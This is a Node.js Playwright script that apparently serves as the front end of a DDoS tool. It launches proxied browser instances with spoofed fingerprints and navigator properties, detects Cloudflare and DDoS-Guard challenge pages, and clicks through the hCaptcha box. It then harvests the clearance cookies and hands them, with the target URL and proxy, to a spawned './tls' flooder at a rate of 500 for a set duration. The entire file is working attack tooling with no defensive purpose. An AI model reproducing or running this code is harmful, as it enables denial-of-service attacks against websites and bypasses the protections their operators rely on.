const { chromium } = require('playwright-extra');
const colors = require('colors');
const fs = require('fs');
const { FingerprintGenerator } = require('fingerprint-generator');
const { FingerprintInjector } = require('fingerprint-injector');
const { spawn } = require('child_process');

process.on('uncaughtException', function (error) {
    //console.log(error)
});
process.on('unhandledRejection', function (error) {
    //console.log(error)
})

const urlT = process.argv[2];
const threadsT = process.argv[3];
const timeT = process.argv[4];

const proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n')

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`(${hours}:${minutes}:${seconds})`.white + ` - ${string}`);
}

async function solver(proxy) {
    log(`💧 `.blue + `New browser instance -> ` + `Chromium (${proxy})`.brightBlue)

    var parts = proxy;
    parts = parts.split(':');

    const fingerprintGenerator = new FingerprintGenerator();

    const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
        browsers: [{ name: 'chrome' }],
    });

    fingerprintGenerator.getFingerprint();

    const fingerprintInjector = new FingerprintInjector();
    const { fingerprint } = browserFingerprintWithHeaders;

    const userAgent = fingerprint.navigator.userAgent;
    const locales = fingerprint.navigator.language;

    const browser = await chromium.launch({
        headless: false,
        javaScriptEnabled: true,
        permissions: ['camera', 'microphone'],
        proxy: { server: 'http://' + proxy },
        args: [
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--use-fake-device-for-media-stream',
            '--use-fake-ui-for-media-stream',
            '--no-sandbox',
            '--enable-experimental-web-platform-features',
            '--disable-dev-shm-usage',
            '--disable-software-rastrizier',
            '--user-agent=' + userAgent,
            '--viewport-size 1920, 1080',
            '--enable-features=NetworkService'
        ],
        ignoreDefaultArgs: ['--enable-automation'],
    });

    const context = await browser.newContext({ locale: locales, viewport: { width: 1920, height: 1080 }, deviceScaleFactor: 1 });	

    const page = await context.newPage();

    await page.setDefaultNavigationTimeout(0);

    await page.setViewportSize({ width: 1920, height: 1080 });
    await page.emulateMedia({ colorScheme: 'dark' })


    try {
        await page.addInitScript(() => {
            ['height', 'width'].forEach(property => {
                const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
                Object.defineProperty(HTMLImageElement.prototype, property, {
                    ...imageDescriptor,
                    get: function () {
                        if (this.complete && this.naturalHeight == 0) {
                            return 20;
                        }
                        return imageDescriptor.get.apply(this);
                    },
                });
            });

            Object.defineProperty(Notification, 'permission', {
                get: function () {
                    return 'default';
                }
            });

            Object.defineProperty(navigator, 'pdfViewerEnabled', {
                get: () => true,
            });

            Object.defineProperty(navigator.connection, 'rtt', {
                get: () => 150,
            });

            Object.defineProperty(navigator, 'share', {
                get: () => false,
            });

            Object.defineProperty(navigator, 'bluetooth', {
                get: () => true,
            });

        })

        await page.addInitScript(() => {
            Object.defineProperty(navigator, 'keyboard', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'mediaCapabilities', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'mediaDevices', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'mediaSession', {
                get: function () {
                    return true;
                }
            });
            Object.defineProperty(navigator, 'oscpu', {
                get: function () {
                    return 'Windows (Win32)';
                }
            });
            Object.defineProperty(navigator, 'platform', {
                get: function () {
                    return 'Win32';
                }
            });
            Object.defineProperty(navigator, 'product', {
                get: function () {
                    return 'Gecko';
                }
            });
            Object.defineProperty(navigator, 'productSub', {
                get: function () {
                    return '20100101';
                }
            });
            Object.defineProperty(navigator, 'vendor', {
                get: function () {
                    return 'Google Inc.';
                }
            });
        });
    } catch (err) { }


    await page.route('***', route => {
        route.continue();
    });

    const response = await page.goto(urlT, { locale: locales, deviceScaleFactor: 1 });

    await page.waitForTimeout(8000);

    const status = await response.status();

    try {
        if (![200, 404].includes(status)) {
            const title = await page.title();
            if (title === 'Just a moment...') {
                log(`❗️ `.yellow + `Detected protection -> ` + `CloudFlare (JS)`.brightYellow);

                await page.waitForTimeout(10000);

                await page.mouse.click(654, 290.1953125);

                log(`⚡️ `.cyan + `Element clicked -> ` + `[ hcaptcha-box ]`.cyan);

                await page.waitForTimeout(8000);

                //if (cookies === "" || cookies === NaN) {
                //    await page.mouse.click(654, 290.1953125);
                //    await page.waitForTimeout(8000);
                //}

                const title = await page.title();
                const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');

                log(`⚡️ `.magenta + `Browser got Title -> ` + `${title ? "" : "[ ] Title is empty"}`.magenta);
                log(`⚡️ `.magenta + `Browser got Cookies -> ` + `${cookies}`.magenta);

                spawn('./tls', [urlT, '500', timeT, parts[0], parts[1], userAgent, cookies]);

                await browser.close();
                await context.close();


            } else if (title === 'DDOS-GUARD') {
                log(`❗️ `.yellow + `Detected protection -> ` + `DDoS Guard`.brightYellow);

                await page.waitForTimeout(3000);

                const title = await page.title();
                const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');

                log(`⚡️ `.magenta + `Browser got Title -> ` + `${title ? "" : "[ ] Title is empty"}`.magenta);
                log(`⚡️ `.magenta + `Browser got Cookies -> ` + `${cookies}`.magenta);

                spawn('./tls', [urlT, '500', timeT, parts[0], parts[1], userAgent, cookies]);

                await browser.close();
                await context.close();
            }
        } else {
            log(`✔  `.green + `No Detect protection ` + `(JS/Captcha)`.green);

            await page.waitForTimeout(1000);

            const title = await page.title();
            const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');

            log(`⚡️ `.magenta + `Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.magenta);
            log(`⚡️ `.magenta + `Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.magenta);

            spawn('./tls', [urlT, '500', timeT, parts[0], parts[1], userAgent, cookies]);

            await browser.close();
            await context.close();
        }
    } catch (e) {
        //console.log(e)

        const proxyN = proxies[Math.floor(Math.random() * proxies.length)];
        solver(proxyN);

        await browser.close();
        await context.close();
    }
}


async function sessionIn() {
    for (let i = 0; i < threadsT; i++) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];

        solver(proxy);
    }
}

function main() {
    sessionIn();
}

main();

setTimeout(() => {
    process.exit(0);
}, timeT * 1000)